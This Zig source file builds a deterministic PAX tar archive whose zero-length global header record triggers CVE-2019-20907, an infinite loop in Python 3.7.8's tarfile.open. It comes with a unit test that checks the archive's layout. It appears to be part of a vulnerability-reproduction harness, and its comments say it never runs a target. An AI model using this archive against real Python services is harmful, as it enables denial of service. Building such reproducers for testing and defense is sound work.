//! Deterministic PAX archive used by the CVE-2019-20907 trigger.
//!
//! One global PAX header whose first record declares length 0: tarfile._proc_pax does not
//! advance, so 3.7.8 loops in tarfile.open. This module only builds the artifact; it never
//! executes Python or a target.

const std = @import("std");

pub const loop_record = "0 a=b\n";
pub const archive_bytes = 1024;

fn put(block: []u8, offset: usize, value: []const u8) void {
    @memcpy(block[offset .. offset + value.len], value);
}

pub fn loopTar(allocator: std.mem.Allocator) ![]u8 {
    const archive = try allocator.alloc(u8, archive_bytes);
    @memset(archive, 0);
    const header = archive[0..512];
    put(header, 0, "pax_global_header");
    put(header, 100, "0000644\x00");
    put(header, 108, "0000000\x00");
    put(header, 116, "0000000\x00");
    put(header, 124, "00000000006\x00");
    put(header, 136, "00000000000\x00");
    @memset(header[148..156], ' ');
    header[156] = 'g';
    put(header, 257, "ustar");
    put(header, 263, "00");
    var checksum: u32 = 0;
    for (header) |byte| checksum += byte;
    var checksum_text: [8]u8 = undefined;
    _ = try std.fmt.bufPrint(&checksum_text, "{o:0>6}\x00 ", .{checksum & 0o777777});
    @memcpy(header[148..156], &checksum_text);
    put(archive, 512, loop_record);
    return archive;
}

test "pax loop archive has the zero-length PAX record" {
    const archive = try loopTar(std.testing.allocator);
    defer std.testing.allocator.free(archive);
    try std.testing.expectEqual(@as(usize, archive_bytes), archive.len);
    try std.testing.expectEqualStrings("pax_global_header", archive[0..17]);
    try std.testing.expectEqual(@as(u8, 'g'), archive[156]);
    try std.testing.expectEqualStrings(loop_record, archive[512 .. 512 + loop_record.len]);
}
